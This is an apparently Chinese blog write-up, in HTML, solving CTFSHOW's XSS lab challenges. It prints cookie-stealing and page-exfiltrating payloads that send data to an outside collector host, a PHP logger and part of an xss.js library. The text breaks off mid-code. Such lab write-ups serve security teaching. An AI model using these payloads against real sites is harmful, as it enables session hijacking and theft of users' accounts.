@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="web316首先起一个服务记录请求参数。   12345678&lt;?php$content &#x3D; $_GET[&quot;a&quot;];if (isset($content)) &amp;#123;    file_put_contents(&quot;flag.txt&quot;, $content.PHP_EOL, FILE_APPEND);&amp;#125;?&gt;&lt;script&gt;al">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Practice - CTFSHOW WEB入门 XSS篇">
+<meta property="og:url" content="https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/index.html">
+<meta property="og:site_name" content="Recharging Runtime">
+<meta property="og:description" content="web316首先起一个服务记录请求参数。   12345678&lt;?php$content &#x3D; $_GET[&quot;a&quot;];if (isset($content)) &amp;#123;    file_put_contents(&quot;flag.txt&quot;, $content.PHP_EOL, FILE_APPEND);&amp;#125;?&gt;&lt;script&gt;al">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-06-07T01:32:53.000Z">
+<meta property="article:modified_time" content="2022-06-18T14:55:32.371Z">
+<meta property="article:author" content="b_y">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Practice">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Practice - CTFSHOW WEB入门 XSS篇</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="Recharging Runtime" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/06/08/ctfshow-web-getting-started-code-audit/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/06/03/ctfshow-web-getting-started-java/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&text=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&title=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&is_video=false&description=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Practice - CTFSHOW WEB入门 XSS篇&body=Check out this article: https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&title=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&title=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&title=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&title=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&name=Practice - CTFSHOW WEB入门 XSS篇&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.477.moe/2022/06/07/ctfshow-web-getting-started-xss/&t=Practice - CTFSHOW WEB入门 XSS篇"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web316"><span class="toc-number">1.</span> <span class="toc-text">web316</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web317-319"><span class="toc-number">2.</span> <span class="toc-text">web317-319</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web320-326"><span class="toc-number">3.</span> <span class="toc-text">web320-326</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web327"><span class="toc-number">4.</span> <span class="toc-text">web327</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web328"><span class="toc-number">5.</span> <span class="toc-text">web328</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web329"><span class="toc-number">6.</span> <span class="toc-text">web329</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web330-331"><span class="toc-number">7.</span> <span class="toc-text">web330-331</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web332"><span class="toc-number">8.</span> <span class="toc-text">web332</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web333"><span class="toc-number">9.</span> <span class="toc-text">web333</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Practice - CTFSHOW WEB入门 XSS篇
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">b_y</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-07T01:32:53.000Z" itemprop="datePublished">2022-06-07</time>
+        
+        (Updated: <time datetime="2022-06-18T14:55:32.371Z" itemprop="dateModified">2022-06-18</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CTF/" rel="tag">CTF</a>, <a class="tag-link-link" href="/tags/Practice/" rel="tag">Practice</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>首先起一个服务记录请求参数。  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="variable">$content</span>.PHP_EOL, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script&gt;<span class="title function_ invoke__">alert</span>(<span class="string">&quot;新年快乐!&quot;</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>然后将 <code>cookie</code> 作为参数拼接构造 <code>payload</code>。<br>payload: <code>&lt;script&gt;document.location.href=&#39;https://visiting-standard-try-jvc.trycloudflare.com/?a=&#39;+document.cookie&lt;/script&gt;</code><br>然后等着 <code>bot</code> 去访问就行了，它的 <code>cookie</code> 里边有 <code>flag</code>。  </p>
+<h2 id="web317-319"><a href="#web317-319" class="headerlink" title="web317-319"></a>web317-319</h2><p>增加了对 script 的过滤。  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;default.txt&quot;</span>, <span class="title function_ invoke__">var_export</span>(<span class="variable">$_GET</span>, <span class="literal">true</span>).PHP_EOL, FILE_APPEND);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>payload: <code>&lt;body onload=&quot;location.href=&#39;http://xxxxx/default.php?cookie=&#39;+document.cookie&quot;&gt;&lt;/body&gt;</code>  </p>
+<h2 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h2><p>burp 抓包二分法 payload 排除可知过滤了空格，改用 %0a 绕过。<br>payload: <code>/?msg=%3Cbody%0aonload%3D%22location.href%3D&#39;http%3A%2F%2Fxxxxx%2Fdefault.php%3Fcookie%3D&#39;%2Bdocument.cookie%22%3E%3C%2Fbody%3E</code>  </p>
+<h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>存储型？一样的 payload。  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/mail.php</span><br><span class="line"></span><br><span class="line">content=%3Cbody+onload%3D%22location.href%3D%27http%3A%2F%2Fxxxxx%2Fdefault.php%3Fcookie%3D%27%2Bdocument.cookie%22%3E%3C%2Fbody%3E%0D%0A&amp;like%5Brank%5D=on&amp;poster=admin&amp;sender=aaa&amp;weather=2</span><br></pre></td></tr></table></figure>
+
+<h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>注册后用户名和密码处存在注入点，这次不能继续用 <code>&lt;body&gt;</code> 了，用回 <code>&lt;script&gt;</code>。<br>这里搭了个 bluelotus 的 xss 平台，default.js 模板，没有过滤。   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://xxxxxx/pt/myjs/d.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>获取 cookie 的 PHPSESSID，伪造后访问 /manager.php 看到 flag。  </p>
+<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>和上题差不多，不过这次获取到的 PHPSESSID 不能伪造了，改用截屏模块获取到 admin 账户密码为 ctfshowdacaiji，登录查看 flag。<br>或者也可以写一个提取 flag 这部分内容然后发过来的脚本，比如：  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> website=<span class="string">&quot;http://xxxxx/default.php&quot;</span>;</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;(<span class="keyword">new</span> <span class="title class_">Image</span>()).<span class="property">src</span>=website+<span class="string">&#x27;/?content=&#x27;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;layui-form layui-border-box layui-table-view&quot;</span>)[<span class="number">0</span>].<span class="property">innerHTML</span>)&#125;)();</span><br></pre></td></tr></table></figure>
+
+<h2 id="web330-331"><a href="#web330-331" class="headerlink" title="web330-331"></a>web330-331</h2><p>这次的 flag 位置改到了提示的位置，如果不是截图脚本的话，盲写脚本还挺困难的… 不对，或许我还可以直接获取整个网页的源码然后返回！  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> website=<span class="string">&quot;http://xxxxx/default.php&quot;</span>;</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;(<span class="keyword">new</span> <span class="title class_">Image</span>()).<span class="property">src</span>=website+<span class="string">&#x27;/?content=&#x27;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span>)&#125;)();</span><br></pre></td></tr></table></figure>
+<p>果然发送前过滤这些信息就是给自己添堵。。。  </p>
+<h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>这道题很怪，密码改不掉、转账 api 都调不了。X 了之后会被转账检测到，转账全失败。。。<br>群主是用 -10000 转给自己然后 buyFlag.php 过的，不知道有没有 xss 解的。  </p>
+<h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>这次 xss 不会影响转账了，而且修复了负数转账的 Bug。<br>直接让 admin 给我打钱  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xss = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> x = &#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;xss.js&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;version&#x27;</span>: <span class="string">&#x27;0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;author&#x27;</span>: <span class="string">&#x27;jackmasa&#x27;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    x.<span class="property">x</span> = <span class="keyword">function</span>(<span class="params">id</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(id)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//容错取值</span></span><br><span class="line">    x.<span class="property">e</span> = <span class="keyword">function</span>(<span class="params">_</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">eval</span>(<span class="string">&#x27;(&#x27;</span> + _ + <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//浏览器 </span></span><br><span class="line">    x.<span class="property">i</span> = &#123;</span><br><span class="line">        <span class="attr">i</span>: !!self.<span class="property">ActiveXObject</span>,</span><br><span class="line">        <span class="attr">c</span>: !!self.<span class="property">chrome</span>,</span><br><span class="line">        <span class="attr">f</span>: self.<span class="property">mozPaintCount</span> &gt; -<span class="number">1</span>,</span><br><span class="line">        <span class="attr">o</span>: !!self.<span class="property">opera</span>,</span><br><span class="line">        <span class="attr">s</span>: !self.<span class="property">chrome</span> &amp;&amp; !!self.<span class="property">WebKitPoint</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//UA</span></span><br><span class="line">    x.<span class="property">ua</span> = navigator.<span class="property">userAgent</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断是否为苹果手持设备</span></span><br><span class="line">    x.<span class="property">apple</span> = x.<span class="property">ua</span>.<span class="title function_">match</span>(<span class="regexp">/ip(one|ad|od)/i</span>) != <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//随机数</span></span><br><span class="line">    x.<span class="property">rdm</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ~~(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">100000</span>)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//url编码(UTF8)</span></span><br><span class="line">    x.<span class="property">ec</span> = <span class="built_in">encodeURIComponent</span>;</span><br><span class="line"></span><br><span class="line">    x.<span class="property">html</span> = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;html&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 销毁一个元素</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    x.<span class="property">kill</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">        e.<span class="property">parentElement</span>.<span class="title function_">removeChild</span>(e);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *绑定事件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    x.<span class="property">bind</span> = <span class="keyword">function</span>(<span class="params">e, name, fn</span>) &#123;</span><br><span class="line">        e.<span class="property">addEventListener</span> ? e.<span class="title function_">addEventListener</span>(name, fn, <span class="literal">false</span>) : e.<span class="title function_">attachEvent</span>(<span class="string">&quot;on&quot;</span> + name, fn);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * dom准备完毕时执行函数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    x.<span class="property">ready</span> = <span class="keyword">function</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!x.<span class="property">i</span>.<span class="property">i</span>) &#123;</span><br><span class="line">            x.<span class="title function_">bind</span>(<span class="variable language_">document</span>, <span class="string">&#x27;DOMContentLoaded&#x27;</span>, fn);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> s = <span class="built_in">setInterval</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">doScroll</span>(<span class="string">&#x27;left&#x27;</span>);</span><br><span class="line">                    <span class="built_in">clearInterval</span>(s);</span><br><span class="line">                    <span class="title function_">fn</span>();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">            &#125;, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 同源检测</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    x.<span class="property">o</span> = <span class="keyword">function</span>(<span class="params">url</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> link = x.<span class="title function_">dom</span>(<span class="string">&#x27;&lt;a href=&quot;&#x27;</span> + <span class="built_in">encodeURI</span>(url) + <span class="string">&#x27;&quot;&gt;&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> link.<span class="property">protocol</span> + link.<span class="property">hostname</span> + <span class="string">&#x27;:&#x27;</span> + link.<span class="property">port</span> == location.<span class="property">protocol</span> + location.<span class="property">hostname</span> + <span class="string">&#x27;:&#x27;</span> + link.<span class="property">port</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * html to dom</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    x.<span class="property">dom</span> = <span class="keyword">function</span>(<span class="params">html, gcsec</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> tmp = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">        tmp.<span class="property">innerHTML</span> = html;</span><br><span class="line">        <span class="keyword">var</span> e = tmp.<span class="property">children</span>[<span class="number">0</span>];</span><br><span class="line">        e.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        x.<span class="property">html</span>.<span class="title function_">appendChild</span>(e);</span><br><span class="line">        gcsec &gt;&gt; <span class="number">0</span> &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            x.<span class="title function_">kill</span>(e);</span><br><span class="line">        &#125;, gcsec * <span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * ajax</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    x.<span class="property">ajax</span> = <span class="keyword">function</span>(<span class="params">url, params, callback</span>) &#123;</span><br><span class="line">        (params <span class="keyword">instanceof</span> <span class="title class_">Function</span>) &amp;&amp; (callback = params, params = <span class="title function_">void</span>(<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">var</span> <span class="variable constant_">XHR</span> = (!x.<span class="title function_">o</span>(url) &amp;&amp; <span class="variable language_">window</span>.<span class="property">XDomainRequest</span>) ||</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span> ||</span><br><span class="line">            (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;MSXML2.XMLHTTP&#x27;</span>)</span><br><span class="line">            &#125;);</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title function_">XHR</span>();</span><br><span class="line">        xhr.<span class="title function_">open</span>(params ? <span class="string">&#x27;post&#x27;</span> : <span class="string">&#x27;get&#x27;</span>, url);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&#x27;content-type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">        callback &amp;&amp; (xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; ((<span class="variable language_">this</span>.<span class="property">status</span> &gt;= <span class="number">200</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> &lt;= <span class="number">300</span>) || <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">304</span>)) &amp;&amp; callback.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        xhr.<span class="title function_">send</span>(params);</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * no ajax</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    x.<span class="property">najax</span> = <span class="keyword">function</span>(<span class="params">url, params</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (params) &#123;</span><br><span class="line">            <span class="keyword">var</span> form = x.<span class="title function_">dom</span>(<span class="string">&#x27;&lt;form method=post accept-charset=utf-8&gt;&#x27;</span>);</span><br><span class="line">            form.<span class="property">action</span> = url;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> name <span class="keyword">in</span> 